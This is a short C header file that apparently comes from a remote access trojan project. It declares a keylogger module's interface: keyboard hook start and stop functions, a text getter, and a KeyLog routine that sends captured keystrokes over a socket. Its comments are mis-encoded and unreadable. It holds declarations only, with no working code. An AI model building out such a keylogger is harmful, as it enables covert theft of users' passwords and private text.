#include "Header.h"
#include "RatProto.h"

#define PERFILENUMS	1000

extern BOOL flag;
extern SOCKET keysockfd;


//��������
typedef HHOOK (*STARTHOOK)(void);
typedef void (*STOPHOOK)(void);
typedef char* (*GETTEXT)(void);


extern STARTHOOK StartHook;
extern STOPHOOK  StopHook;
extern GETTEXT	 GetText;

//�������̼��
HHOOK Start2Hook(SOCKET sockfd);
//�رռ��̼��
BOOL Stop2Hook(SOCKET sockfd);
//���ͼ��̼�¼
void KeyLog(void);